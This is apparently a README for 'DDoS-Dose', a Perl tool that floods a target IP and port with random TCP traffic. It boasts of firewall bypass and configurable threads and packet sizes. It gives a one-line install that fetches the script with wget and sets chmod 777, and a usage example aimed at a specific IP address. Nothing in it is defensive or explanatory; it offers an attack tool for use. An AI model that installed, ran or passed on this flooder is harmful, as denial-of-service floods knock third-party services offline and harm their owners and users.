
# Script for DDoS-Dose !

## Features

- Generate Random TCP Traffic
- To Target Port & from Random Port
- Require HPC (High Performance Computing) Server
- Can bypass some ISP Firewalls
- Language: Perl
- multi-threads
- Configure threads, packet size, number of packet, delay
## Installation

One Line Setup for Debian Based distro ~ Ubuntu, Debian

```bash
  apt update -y && apt install perl -y && apt install wget -y && wget https://raw.githubusercontent.com/cyberceros/ddos-dose/main/Layer4/TCP/random-tcp%20%7C%20ID%3AA2/random-tcp.pl && chmod 777 *

```
## Usage

```
perl random-tcp.pl 162.241.27.65
perl random-tcp.pl <target ip> 
```
```
- This script can be configured with number of threads (line 9)
- This script can be configured with size of packets (line 10)
- This script can be configured with number of packets (line 11)
- This script can be configured with delay b/w packets (line 12)
- This script can be configured with target PORT (line 16)
- Can adjust time by "timeout 30" command,
```

## Authors

- [@cyberceros](https://www.github.com/cyberceros)
## Feedback

If you have any feedback, please reach out to us at n@dultr.in
